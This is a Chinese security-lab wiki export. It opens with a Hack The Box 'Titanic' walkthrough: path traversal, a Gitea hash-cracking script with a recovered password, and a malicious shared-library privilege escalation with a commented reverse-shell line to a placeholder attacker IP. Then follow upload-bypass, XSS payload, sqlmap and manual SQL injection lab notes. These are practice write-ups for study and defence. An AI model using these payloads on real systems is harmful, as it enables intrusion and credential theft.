参数看起来很可疑。尝试利用它进行路径遍历，读取服务器上的敏感文件。我们尝试读取 /etc/passwd： 修改 Burp Repeater 中的请求，将 /download?ticket=UUID.json 改为 /download?ticket=../../../../../../etc/passwd。 成功读取！这确认了路径遍历漏洞的存在。在 /etc/passwd 中，我们注意到了 developer 用户。 三、 利用路径遍历深入挖掘 1. 探索开发环境 (dev.titanic.htb) 访问之前发现的子域名 http://dev.titanic.htb/。 页面显示这是一个 Gitea 服务（一个自托管的 Git 服务），然后转向左上角探索，可以看到代码仓库。 查看到 docker-compose.yml 的配置片段。 12volumes: - /home/developer/gitea/data:/data # Replace with your path 这表明 Gitea 容器的 /data 目录映射到了宿主机的 /home/developer/gitea/data 目录。 2. 读取 Gitea 配置文件 Gitea 的默认配置文件通常位于 /etc/gitea/conf/app.ini 或其数据目录下的 gitea/conf/app.ini。结合上面发现的 Volume 映射，我们可以推断出宿主机上配置文件的实际路径可能是 /home/developer/gitea/data/gitea/conf/app.ini。 3. 分析配置文件，定位数据库 利用之前发现的路径遍历漏洞，尝试读取这个文件： 在 app.ini 文件中，我们找到了数据库的配置信息： 1234567[database]DB_TYPE = sqlite3HOST = 127.0.0.1:3306NAME = giteaUSER = rootPASSWD =PATH = /data/gitea/gitea.db ; Path to the database file for sqlite3 关键信息： 数据库类型：SQLite3 数据库文件路径 (容器内): /data/gitea/gitea.db 结合之前的 Volume 映射 (/home/developer/gitea/data:/data)，我们可以确定数据库文件在宿主机上的绝对路径为：/home/developer/gitea/data/gitea/gitea.db。 四、 获取用户权限 (User Flag) 1. 下载 Gitea 数据库 既然知道了数据库文件的绝对路径，我们可以再次利用路径遍历漏洞将其下载到本地进行分析： 2. 分析数据库，提取密码哈希 使用 SQLite 客户端打开下载的 gitea.db 文件，查找用户表（通常是 user 表）。 找到了 developer 用户的密码哈希和对应的盐值 (Salt)： 用户: developer 哈希 (passwd): e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 盐 (salt): 8bf3e3452b78544f8bee9400d6936d34 (需要注意，数据库中存储的是 Hex 编码的字符串，使用时需要解码为 bytes) Gitea 通常使用 PBKDF2-HMAC-SHA256 算法来存储密码哈希。需要破解这个哈希来获取 developer 用户的明文密码。 3. 破解密码哈希 可以使用 Hashcat 或者编写一个简单的 Python 脚本来尝试破解。使用 hashlib.pbkdf2_hmac 结合字典进行爆破。Gitea 的默认迭代次数通常较高（如 50000），需要在破解时指定正确的参数。 准备字典: 将使用常见的 rockyou.txt 字典。 Python 破解脚本 (crack_gitea.py): 12345678910111213141516171819202122232425262728293031323334import hashlibimport binascii def pbkdf2_hash(password, salt, iterations=50000, dklen=50): hash_value = hashlib.pbkdf2_hmac( &#x27;sha256&#x27;, password.encode(&#x27;utf-8&#x27;), salt, iterations, dklen ) return hash_value def find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50): target_hash_bytes = binascii.unhexlify(target_hash) with open(dictionary_file, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file: count = 0 for line in file: password = line.strip() hash_value = pbkdf2_hash(password, salt, iterations, dklen) count += 1 print(f&quot;正在检查密码 &#123;count&#125;: &#123;password&#125;&quot;) if hash_value == target_hash_bytes: print(f&quot; Found password: &#123;password&#125;&quot;) return password print(&quot;Password not found.&quot;) return None salt = binascii.unhexlify(&#x27;8bf3e3452b78544f8bee9400d6936d34&#x27;)target_hash = &#x27;e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56&#x27;# 字典的路径dictionary_file = &#x27;/home/admin/tool/rockyou.txt&#x27;find_matching_password(dictionary_file, target_hash, salt) 运行脚本进行破解: 1python crack_gitea.py 脚本成功找到了密码！ 用户名: developer 密码: 25282528 4. SSH 登录并获取 User Flag 现在我们拥有了 developer 用户的凭据，可以通过 SSH 登录目标机器： 12ssh developer@titanic.htb# 输入密码: 25282528 登录成功后，查找并读取 user.txt 文件： 成功获取 User Flag！ 五、 权限提升 (Root Flag) 获取了普通用户权限后，下一步是寻找提权到 root 的方法。 1. 本地枚举 在 developer 用户下进行枚举，寻找潜在的提权向量。检查 sudo -l、SUID 文件、计划任务 (cron jobs)、系统服务配置、可写目录和可执行脚本等。 sudo -l: developer 用户无法免密执行任何 sudo 命令。 查找可执行脚本和可写目录： 123456789# 查找 /opt 目录下用户可执行的文件developer@titanic:~$ find /opt -type f -perm -u=x 2&gt;/dev/null/opt/scripts/identify_images.sh/opt/app/app.py# 查找 /opt 目录下用户可写的目录developer@titanic:~$ find /opt -writable -type d 2&gt;/dev/null/opt/app/static/assets/images/opt/app/tickets 我们发现了一个可执行脚本 /opt/scripts/identify_images.sh 和一个用户可写的目录 /opt/app/static/assets/images。这值得深入研究。 2. 分析可疑脚本 查看 /opt/scripts/identify_images.sh 的内容： 脚本的关键行为： cd /opt/app/static/assets/images: 切换工作目录到我们可写的目录！ 执行 /usr/bin/magick identify 命令处理该目录下的 .jpg 文件。 如果这个脚本是由 root 用户定期运行（例如通过 cron），并且 magick 命令存在某种漏洞，我们就有机会利用可写目录来执行代码。 3. 检查 ImageMagick 版本并查找漏洞 查看 /usr/bin/magick 的版本： 版本为 ImageMagick 7.1.1-35。搜索该版本的漏洞，发现一个相关的 CVE 或安全公告：GHSA-8rxc-922v-phg8。 这个漏洞与 ImageMagick 的 AppImage 打包有关。其 AppRun 启动脚本在设置某些环境变量（如 LD_PRELOAD, LD_LIBRARY_PATH 或 MAGICK_CONFIGURE_PATH）时，会查找并加载当前工作目录下的某些配置文件或库文件。 漏洞利用思路: /opt/scripts/identify_images.sh 脚本首先 cd 进入了我们可写的目录 /opt/app/static/assets/images。 然后，脚本以其执行者（推测是 root）的权限执行 /usr/bin/magick identify。 由于 magick 是一个 AppImage 打包的程序 (或其启动脚本存在类似行为)，它在启动时会检查当前工作目录（也就是我们可写的 /opt/app/static/assets/images）是否存在特定的库文件。 如果我们在这个可写目录下放置一个精心构造的、与 ImageMagick 期望加载的库同名的恶意共享库（.so 文件），那么 magick 命令在执行时就会加载并执行我们库中的代码。 利用 C 语言的 __attribute__((constructor)) 特性，可以在共享库被加载时自动执行我们定义的函数（Payload）。 4. 制作并部署恶意共享库 a. 编写恶意 C 代码 (exploit.c): 创建一个 C 文件，包含我们的 payload。Payload 的目标是将 /root/root.txt 文件复制到我们可访问的目录 /opt/app/static/assets/images/ 并修改其权限，以便我们能读取它。 12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;// 这个函数会在库被加载时自动运行__attribute__((constructor)) void run_payload()&#123; // 以 root 权限执行复制和修改权限操作 system(&quot;cp /root/root.txt /opt/app/static/assets/images/root.txt&quot;); system(&quot;chmod 777 /opt/app/static/assets/images/root.txt&quot;); // 可以选择性地添加其他命令，例如反弹 shell // system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/YOUR_ATTACKER_IP/PORT 0&gt;&amp;1&#x27;&quot;); // exit(0); // 执行完后可以退出，避免 ImageMagick 报错&#125; b. 编译共享库: 在你的攻击机或目标机器上（如果目标机器上有 gcc），使用 gcc 将 C 代码编译成共享库。根据漏洞 PoC 或常见实践，我们可以尝试使用 ImageMagick 可能加载的库名，例如 libxcb.so.1。 将编译好的 libxcb.so.1 文件放置到目标脚本的工作目录，也就是我们可写的 /opt/app/static/assets/images/ 目录下。 1gcc -shared -fPIC -o ./libxcb.so.1 exploit.c 5. 等待触发与获取 Root Flag 现在，我们只需要等待 /opt/scripts/identify_images.sh 脚本被执行。这个脚本很可能是通过 root 用户的 Cron 任务定时运行的（例如，每隔几分钟）。 当脚本运行时： 它会 cd 到 /opt/app/static/assets/images/。 它会以 root 权限执行 /usr/bin/magick identify。 magick 进程启动时，会查找并加载当前目录下的 libxcb.so.1。 我们恶意库中的 run_payload 函数被执行。 /root/root.txt 文件被复制到 /opt/app/static/assets/images/root.txt，并且权限被设置为 777。 等待一小段时间（可能需要几分钟），然后检查 /opt/app/static/assets/images/ 目录： 123developer@titanic:/opt/app/static/assets/images$ ls -ltotal 1.3M-rwxrwxrwx 1 root root 33 Apr 5 07:05 root.txt # &lt;-- 文件出现了！权限是 777 成功获取 Root Flag！ 六、 总结 Titanic 靶机是一次有趣且涵盖多种技术的渗透测试体验： 初始 foothold: 通过 Nmap 发现重定向，配置 hosts 文件访问 Web 服务。 Web 漏洞: 利用预订表单后的 /download 功能存在的路径遍历漏洞，读取了敏感文件。 信息泄露: 通过路径遍历读取了 dev 子域 Gitea 服务的配置文件 (app.ini) 和 SQLite 数据库 (gitea.db)。 密码破解: 从数据库中提取了 developer 用户的 PBKDF2 哈希和盐值，并使用字典爆破得到明文密码。 获取用户权限: 使用破解的凭据 SSH 登录 developer 用户，获得 user flag。 权限提升: 分析发现一个由 root 运行的脚本 (identify_images.sh) 会在用户可写目录下执行 ImageMagick (magick)。利用 ImageMagick AppImage 的库加载漏洞 (GHSA-8rxc-922v-phg8)，通过放置恶意共享库 (.so 文件) 在脚本的工作目录，实现了代码执行，最终获取了 root flag。 七、 防护与缓解措施 修复路径遍历漏洞 (/download): 对用户输入进行严格过滤，禁止路径遍历字符 (../)。 在访问文件前，确保请求的路径位于授权的目录下。 保护敏感文件: 修复导致文件泄露的根源漏洞（如路径遍历）。 遵循最小权限原则，确保 Web 应用进程无权访问 Gitea 等其他服务的配置文件和数据。 强化身份验证: 强制使用强密码策略，增加密码破解难度。 考虑为 Gitea 等关键服务启用双因素认证 (2FA)。 安全配置计划任务与脚本: 避免让以高权限运行的脚本（如 Cron 任务）在用户可写的目录下执行外部命令。 如果必须在特定目录执行，确保所调用的程序（如 ImageMagick）已更新至最新版本，并已修复已知的库加载或命令注入漏洞。 定期审计系统上的 SUID/SGID 文件、计划任务和不安全的服务配置。","tags":[null],"categories":[null]},{"title":"Upload-labs 靶场","path":"/wiki/XSS-and-Security-Labs/Upload-labs.html","content":"项目地址：https://github.com/c0ny1/upload-labs 一、前端 JS 检测绕过 上传一个 php 文件，失败了，只允许图片为后缀的文件进行上传。这一关的关键是*“JavaScript 代码对文件后缀进行校验”*。JavaScript 属于前端范畴，而前端校验不会发出数据包，不会与服务器进行交互 第一种方式：浏览器直接 F12，找到checkFile()函数，进行删除。更为极端的方法是F12 --&gt; F1 --&gt; 禁用JavaScript，最后上传 PHP 木马 第二种方式：用 burp 拦截上传数据包， 对文件名进行修改 第一种方式： 删除 checkFile() 函数 极端的方法 **第二种方式：**传一个.jpg格式的图片，用 burp 抓包修改文件名和文件内容 二、MIME 类型检测绕过 MIME 是描述*消息内容类型*的因特网标准——MIME 参考手册 Content-Type 通常出现在 HTTP 请求头部中，指示请求的数据类型，或者是数据的 MIME 类型 1234# 常见的 MIME 类型text/plain：纯文本text/html：HTML 格式的文档image/png：PNG 格式的图片 这一关的关键是，使用Content-Type字段的值判断上传文件是否合法，只允许 image/jpeg、image/png、image/gif 文件的上传 用 burp 截取并修改数据包中的 Content-Type 类型进行绕过 三、后缀检测-黑名单绕过 黑名单绕过的常见方式有： 改变文件后缀名，使用不在黑名单中的文件后缀，例如php2、php3、php4、php5、phtm 拼接文件名 使用压缩文件 修改文件内容 …… 通过 burp 拦截修改数据包中的文件名后缀为.php5 如果服务器是 Apache，也可用.htaccess来进行绕过，但是文件会在上传的过程中修改文件名 四、后缀检测-黑名单绕过（.htaccess） .htaccess文件可以被用来限制特定的文件类型的上传或执行。从源码中得知没有对.htaccess限制 上传.htaccess文件，写入以下内容 12# .shell 文件会被解析为 php 文件AddType application/x-httpd-php .shell 然后上传一个后缀名为.shell的文件，执行 webshell 五、后缀检测-后缀名点空格绕过 双写小数点，. .——中间是空格，围绕着小数点 由于一些操作系统和文件系统*不允许文件名以点号结尾，因此上传时会自动删除*最后一个点号 六、后缀检测-后缀名大小写绕过 观察源代码，发现服务器检查后缀忽视了“大小写”的检测，也就是没出现“strtolower() 函数”。 而“strtolower() 函数”用于将字符串中的所有字符转换为小写字母 七、后缀检测-后缀名空格绕过 观察源代码，发现服务器检查后缀忽视了“空格”的检测，也就是没出现“trim() 函数”。 trim()是 PHP 中的一个字符串函数，用于*删除字符串首尾的空格*或其他指定字符 理应加上$file_ext = trim($file_ext); 八、后缀检测-后缀名点绕过 观察源代码，发现服务器检查后缀忽视了“后缀名点”的检测，也就是没出现“deldot() 函数”。 deldot()函数用于在文件上传*防止后缀名点绕过攻击*。该函数的作用是将文件名中的所有点（包括后缀名点和其他点）都删除，以确保文件名的完整性和正确性。 上传文件并用 burp 抓包，在文件名中添加*额外的点*来绕过文件扩展名的检查 九、后缀检测-特殊字符串 可以通过在文件名中添加::$DATA来告诉 Windows 访问文件的资源，并将其当作可执行代码来执行 十、后缀检测-点空格绕过 同第五关 观察代码，发现先删除文件名末尾点.，再首尾去空格，由此想到 双写小数点，. .——中间是空格，围绕着小数点 十一、后缀检测-后缀名双写绕过 使用了str_ireplace()函数，替换成空，可以用双写绕过 上传文件名 code.p.phphp，上传文件时会删除 .php，最后的上传文件名： code.php 十二、后缀检测-GET方式00截断 %00 截断，用在 php 版本 5.3.29以下，magic_quotes_gpc 为 Off 状态 通过抓包，能够看到上传路径，使用 00 截断，抓包修改上传路径save_path=../upload/code.php%00，即可绕过。 “00截断”（Null byte injection）是一种 Web 应用程序安全漏洞，攻击者通过在输入数据中插入 ASCII 码为 0 的 null 字符（\\x00），来绕过字符串截断等安全措施，导致应用程序执行意外的操作或暴露敏感信息。 十三、后缀检测-POST方式00截断 GET 会自行解码%00，POST 不会自行解码 十四、内容检测-文件头检测绕过 检测文件头，源码会根据图片的*前两个字节*来判定文件类型，所以需要把 webshell 的后缀改为图片格式 制作图片木马 1copy code.jpg /b + code.php /a webshell.jpg 十五、内容检测-getimagesize()函数 getimagesize()函数来验证是否是图片。依旧是生成带有 php 代码的图片，进行上传 十六、内容检测-exif_imagetype()函数 使用exif_imagetype函数来检查是否是图片，读取图像的第一个字节并检查其签名。依旧是生成带有 php 代码的图片，进行上传 十七、内容检测-图片二次渲染绕过 图片的二次渲染会把第一次渲染添加的 PHP 代码删掉。 绕过的方式是，查看*图片的渲染后没有修改的位置*，添加一句话木马 未完待续……","tags":[null],"categories":[null]},{"title":"XSS Challenges","path":"/wiki/XSS-and-Security-Labs/XSS Challenges.html","content":"XSS 挑战 （由 yamagata21） - 阶段 #1 (int21h.jp) 题目要求注入 JavaScript 命令： alert(document.domain); Stage #1 输入321来定位代码的位置，发现是处于&lt;b&gt;&lt;/b&gt;标签之内，没有任何过滤 12345// 第一种方法是闭合 b 标签，插入 Script 标签&quot;&lt;/b&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//// 第二种方法是直接在 b 标签内部构造 XSS&lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 闭合 b 标签的方式 直接在 b 标签内部构造 XSS Stage #2 输入321来定位代码的位置，发现注入点在input标签的value属性里面 123456// 第一种方法是闭合 input 标签，插入 Script 标签&quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//// 第二种方法是在 input 标签中插入属性// onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码123&quot; onmouseover=alert(document.domain)&gt;// 定位位置 闭合 input 标签，插入 Script 标签 input 标签中插入属性 Stage #3 输入321来定位代码的位置，发现注入点在b标签，于是乎使用 stage1 的 payload，结果失败了 失败原因，用于构造标签的&lt;&gt;和&quot;被转义了 &lt;&gt; --&gt; &amp;lt;&amp;gt; &quot; --&gt; &amp;quot; 通过查看源代码发现有两个参数，P1 是文本输入，P2 是下拉列表，因为 P1 有过滤，所以对 P2 进行注入 用 burp 截取数据包，篡改 P2 的值，Forward 放包之后会发现弹出 12// burp 中对 P2 参数进行注入， p1=123&amp;p2=&lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 两个参数 Stage #4 输入321来定位代码的位置，发现注入点还是在b标签，但是用 burp 抓包后发现了三个参数，P1、P2、P3 从源代码中搜索 P3 的值 hackme，发现是在一个 input 标签的 value 属性中，且type=&quot;hidden&quot;，这说明该 input 元素在网页页面是不可见的，换言之网页上面不显示输入框，做了隐藏处理。 12// 用 burp 截取数据包，然后对 P3 参数进行篡改，用 &quot;&gt; 闭合 input 标签，插入 Script 标签&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 查询 P3 的值 在 burp 中修改 P3 的值然后放包 P3 参数处注入 Stage #5 输入321来定位代码的位置，发现注入点在input标签的value属性里面 但与 Stage #2 不同的是 input 标签中加入了maxlength 属性，其值为15，意思是输入的字符不能超过 15。 maxlength 属性规定 元素中允许的最大字符数。 像是这中前端的设置是可以在源代码中进行修改，进而绕过限制 然后把maxlength的值设置为100，接着就是 Stage #2 的步骤 123456// 第一种方法是闭合 input 标签，插入 Script 标签&quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//// 第二种方法是在 input 标签中插入属性// onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码123&quot; onmouseover=alert(document.domain)&gt;// 定位位置 修改 maxlength 的值 成功弹窗 Stage #6 输入321来定位代码的位置，发现注入点还是在input标签的value属性中 于是用 Stage #2 闭合input 的方式来构造 XSS，测试后发现过滤了&lt;&gt;，但没有过滤&quot;， 这说明不可以用新标签，只能在input标签内通过&quot;闭合前面的属性的方式，为后面新增属性 &gt; --&gt; &amp;gt; HTML 事件 | 菜鸟教程 (runoob.com) 12345// 需要点击搜索框触发，&quot; onclick=alert(document.domain)\t// 需要移动到搜索框触发&quot; onmouseover=alert(document.domain) 查看过滤情况 鼠标事件 Stage #7 注入点还是在input标签的value属性中，但依旧是过滤了&lt;&gt;和&quot; 12345&quot; onmouseover=alert(document.domain)// 321 会写入 input 的 value 值中，空格做个分隔，写后面的属性321 οnmοuseοver=alert(document.domain)321 onclick=alert(document.domain) 查看过滤 用点击事件 Stage #8 输入字符发现注入点在a标签的href属性中，随即想到JavaScript 伪协议绕过（需要点一下链接才能弹窗） 123// javascript 伪协议// &lt;a&gt; 标签的 href 属性用于指定超链接目标的 URL，href 属性的值可以是 JavaScript 表达式javascript:alert(document.domain); 定位 JavaScript 伪协议 Stage #9 听说开发者是日本人，难怪会有这种题目 通过 burp 抓包发现参数是charset=euc-jp，亦即日文编码，需要识别 UTF-7 的 IE 浏览器（但 IE 已经退役了……） 看了其他人的方法，在控制台输出弹窗绕过 Stage #10 定位在input标签的value属性中，但domain过滤了，可以使用嵌套绕过的方式 1234567// 嵌套绕过&quot;&gt;&lt;script&gt;alert(document.domadomainin)&lt;/script&gt;// 看其他人有用 base 64 编码的方式来绕过的，但是需要解密函数 atob() 对字符串进行解密再进行执行// eval()函数计算 JavaScript 字符串，并把它作为脚本代码来执行alert(document.domain) 经过 base 64 编码后，YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;&gt;&lt;script&gt;eval(atob(&#x27;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&#x27;));&lt;/script&gt; 嵌套 Stage #11 从此关开始打不开了","tags":[null],"categories":[null]},{"title":"Hack The Box (HTB)","path":"/wiki/XSS-and-Security-Labs/index - 2.html","content":"Hack The Box (HTB) 是一个在线的网络安全训练平台，旨在提供真实世界的渗透测试和漏洞利用经验。它提供了一个虚拟实验环境，供安全专业人员和爱好者进行挑战和学习。 以下是关于 Hack The Box 平台的一些特点和信息： 实践导向：Hack The Box 提供了大量的虚拟机（称为“盒子”），每个盒子都代表一个具体的渗透测试场景，包括各种不同类型的漏洞和安全挑战。用户需要尝试渗透这些盒子，找到漏洞并获得管理员权限。通过实践攻击和解决问题，用户可以增强他们的渗透测试技能。 真实世界场景：HTB 的盒子和挑战都基于真实世界的漏洞和安全问题。这使得用户可以在一个模拟的、安全的环境中练习和测试他们的技能，而不会对真实系统和网络造成任何伤害。 社区和排行榜：HTB 是一个活跃的社区，用户可以与其他安全专业人员和爱好者交流和分享经验。平台还提供排行榜，用户可以在其中与其他用户比较并展示他们的技能。 等级和奖励系统：Hack The Box 平台基于用户的活动和成就提供等级和奖励系统。通过攻击和解决更多的盒子和挑战，用户可以获得更高的等级和奖励，这也有助于激励用户持续学习和提高他们的技能。 Lab 环境：除了盒子和挑战之外，HTB 还提供了一个Lab环境，让用户可以构建自己的虚拟实验环境，进行更多自定义的渗透测试和练习。 请注意，Hack The Box 是一个专门为渗透测试和安全研究人员设计的平台。在参与HTB的活动时，用户需要遵守平台的规则和道德准则，并确保只在授权的环境中进行活动。","tags":[null],"categories":[null]},{"title":"Web 安全靶场与 XSS 挑战文档","path":"/wiki/XSS-and-Security-Labs/index.html","content":"汇集了我之前做过的靶场和学习资源，包括Hack The Box、 DVWA、XSS 挑战和 SQL 注入等。","tags":[null],"categories":[null]},{"title":"sqli-labs 靶场使用 SQLMap 注入（1-25 关）","path":"/wiki/XSS-and-Security-Labs/sqli-labs-SQLMap.html","content":"注意点： sqlmap 需要 python 的环境，并配置环境变量 在实际检测过程中，sqlmap 会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数--batch命令来自动答复和判断 用 sqlmap 工具注入完毕后，C 盘 AppData 文件夹下会有缓存文件夹，不删掉的话会影响 SQL 注入结果C:\\Users\\20846\\AppData\\Local\\sqlmap\\output，也可用sqlmap.py --purge来清空缓存 Less-1 123python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; --batch --banner# --batch 从不询问用户输入，使用所有默认配置，换言之对所有的交互式的都是默认的# -b, --banner 获取数据库管理系统的标识 12# 查看数据库python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; --dbs 爆出数据库名 12# sqlmap -u [&quot;URL&quot;] -D [&quot;数据库名&quot;] --tables //查询当前数据库中的所有表python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security --tables 查询 security 数据库中的所有表 12# sqlmap -u [&quot;URL&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] --columns //查询指定库中指定表的所有列(字段)python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security -T users --columns 查看 security 数据库下的 users 表里都有哪些字段 123456# sqlmap -u -D security -T users -C id,password,username --dump# 爆出数据库 security 中的 users 表中的 id,password,username 列中的所有数据python sqlmap.py -u &quot;http://localhost/sqli-labs/Less-1/?id=1&quot; -D security -T users -C id,password,username --dump# --dump 将结果保存下来 查看列字段的具体值 因此，只要能找到注入点和数据库，就算上成功了 Less-2 以下操作都是基于 Less-1 的步骤，如法炮制而来 1sqlmap -u http://localhost/sqli-labs/Less-2/?id=1 --batch --dbs 找到数据库 Less-3 1sqlmap -u http://localhost/sqli-labs/Less-3/?id=1 --batch --dbs Less-4 1sqlmap -u http://localhost/sqli-labs/Less-4/?id=1 --batch --dbs Less-5 1sqlmap -u http://localhost/sqli-labs/Less-5/?id=1 --batch --dbs Less-6 1sqlmap -u http://localhost/sqli-labs/Less-6/?id=1 --batch --dbs Less-7 1sqlmap -u http://localhost/sqli-labs/Less-7/?id=1 --batch --dbs Less-8 1sqlmap -u http://localhost/sqli-labs/Less-8/?id=1 --batch --dbs Less-9 1sqlmap -u http://localhost/sqli-labs/Less-9/?id=1 --batch --dbs Less-10 12sqlmap -u http://localhost/sqli-labs/Less-10/?id=1 -level=2 --batch --dbs# 当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入 Less-11 1234567sqlmap -u http://localhost/sqli-labs/Less-11/index.php --batch --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --dbs # 从该关开始，注入的位置不再是 URL，且请求变为了 POST，因此命令要随之而变。对于是 post 提交数据的 URL，需要指定其 data 参数，--data 能够抓取其 post 提交的数据填入# 还有一种方法是：因为 Less-11 该关需要进行登录，可以先用账号 admin 密码 admin 登录，然后用 burp 抓包，将 burp 抓取的包保存为 target.txt，利用 sqlmap -r target.txt 命令，来探测 target.txt 文件中的 http 数据包是否存在 sql 注入漏洞sqlmap -r target.txt Less-12 1sqlmap -u http://localhost/sqli-labs/Less-12/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-13 1sqlmap -u http://localhost/sqli-labs/Less-13/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-14 1sqlmap -u http://localhost/sqli-labs/Less-14/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-15 1sqlmap -u http://localhost/sqli-labs/Less-15/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --dbs --batch 以下略去 Less-16 1sqlmap -u http://localhost/sqli-labs/Less-16/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs --level=2 Less-17 1sqlmap -u http://localhost/sqli-labs/Less-17/index.php --data &quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --dbs Less-18 12345# 注入的位置在 User-Agent 中sqlmap -u http://localhost/sqli-labs/Less-18/ --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --user-agent=&quot;*&quot; --thread=10 --dbs # --thread=10，设置多线程，并行处理请求加快效率# --user-agent=&quot;*&quot; 是用来指定 User-Agent Less-19 1234# 注入的位置在 Referer 中sqlmap -u &quot;http://localhost/sqli-labs/Less-19/&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot; --batch --referer=&quot;*&quot; --thread=10 --dbs# --referer，伪造 referer 字段 Less-20 12345# 注入的位置在 cookie 中sqlmap -u http://localhost/sqli-labs/Less-20/index.php --cookie=&quot;uname=admin&quot; --dbs --batch --level=5 --risk=3 # 同样，可以用 burp 抓包保存 ，殊途同归，第一次失败了，于是提高了线程，这将导致查询速度降低sqlmap -r target-20.txt --leve=5 --risk=3 --dbs Less-21 12# 注入的位置依旧在 cookie 中，但经过了 base64 加密的，用 sqlmap 来进行联合查询注入sqlmap -u http://localhost/sqli-labs/Less-21/index.php --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch 1234567sqlmap -u http://localhost/sqli-labs/Less-21/index.php --cookie=&quot;uname=*&quot; --tamper=&quot;base64encode&quot; --dbms=MySQL --random-agent --flush-session --technique=U --dbs --batch -v 3# --random-agent --&gt; 使用任意的User-Agent爆破# --flush-session --&gt; sqlmap 扫描的时候会将缓存的数据记录到 output 文件下，下次扫描时会直接调用本地缓存的扫描结果。如果我们想删除缓存结果，重新对某网站进行扫描就需要添加 --flush-session 选项。# --dbms=MySQ --&gt; 指定其数据库为mysql# --tamper base64encode --&gt; 对提交的数据进行base64编码# --technique=U --&gt; 指定注入点类型，u 是指的 union 联合查询注入。其他还有 U/B/T/S# -v --&gt; 3 能看到 payload Less-22 1sqlmap -u http://localhost/sqli-labs/Less-22/index.php --cookie=&quot;uname=*&quot; --dbs --tamper &quot;base64encode.py&quot; --batch Less-23 1sqlmap -u http://localhost/sqli-labs/Less-23/?id=1 --dbs --batch Less-24 1234# 这关是二次注入，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。# 需要先注册账号 admin&#x27;#，然后修改密码，后面的 # 号注释掉了# Sql 语句变为UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =&#x27; admin&#x27; # &#x27; AND password=&#x27; Less-25 1sqlmap -u http://localhost/sqli-labs/Less-25/?id=1 --dbs --batch","tags":[null],"categories":[null]},{"title":"sqli-labs 靶场（手工注入）","path":"/wiki/XSS-and-Security-Labs/sqli-labs.html","content":"前言 参考： SQLI labs 靶场精简学习记录 https://github.com/Audi-1/sqli-labs 工具方面可用老版本的 Hackerbar，以及抓包工具 Burpsuite Less-1 可先查看数据库的记录次数 一直增大 id 的值，当 id 的值大于 14，得到的是一个没有用户名和密码的空白页面，这意味着数据库只有 14 条记录 ?id=1 …… ?id=14 12345678910**但是我们并不知道开发者具体是怎样封装 id 参数值的。所以得先找封装形式**- 使用基于错误返回的 SQL 注入，单引号`&#x27;`或者转义符`\\` > 通过转义字符来找出 参数封装形式，在MYSQL中 &#x27;\\&#x27;(反斜杠)被用来转义一个字符。转义一个字符意味着取消该字符的特殊用途。使用转义字符可以得到更清楚的图片。- ```sql ?id=1&#x27; ?id=1\\ less-1 到 less-4 的封装形式 破坏查询的同时，用--+修复它的语法错误，-- 是 SQL 的注释语句 输入 1'--+ 或者输入 1'--%20（%20 URL编码为空格） 或者输入 1'%23 （%23 URL编码为 # ） 1SELECT * from table_name WHERE id=&#x27;1&#x27;--+&#x27; LIMIT 0,1 使用联合查询 接下来在引号和 --+ 之间添加查询来获取数据库中的信息 通过order by 1来查询有几列，之所以需要知道数据库有几列是因为联合查询 union 规定的，得知总共有 3 列 ?id=1' order by 1 --+ --&gt; 返回正确 ?id=1' order by 4 --+ --&gt; 返回错误 1234-- UNION，没有错误?id=1&#x27; union select 1,2,3 --+SELECT * from table_name WHERE ?id=&#x27;1&#x27; union select 1,2,3 --+&#x27; 但是我们得到的是第一个查询的结果集，为了将第二个查询的结果显示在屏幕上，我们必须将第一条查询的结果集置为EMPTY。这点可通过给定 id 一个不存在的值来实现。我们可以将 id 的值设为负或者大于14，因为前面已经发现了数据库中只有14条记录。 union 12345?id=-1&#x27; union select 1,2,3 --+或者?id=15&#x27; union select 1,2,3 --+SELECT * from table_name WHERE ?id=&#x27;-1&#x27; union select 1,2,3 --+&#x27; 数据库的版本信息 1234-- 数据库的版本信息?id=-1&#x27; union select 1,2,version() --+-- 正在使用的数据库信息和当前后端所使用的数据库的版本信息?id=-1&#x27; union select 1,database(),version() --+ 基于错误返回的SQL查询 基于联合查询的SQL注入 为了让联合注入工作，首先要知道数据库中的表名，键入 123456789101112id=-1&#x27; union select 1,table_name,3 from 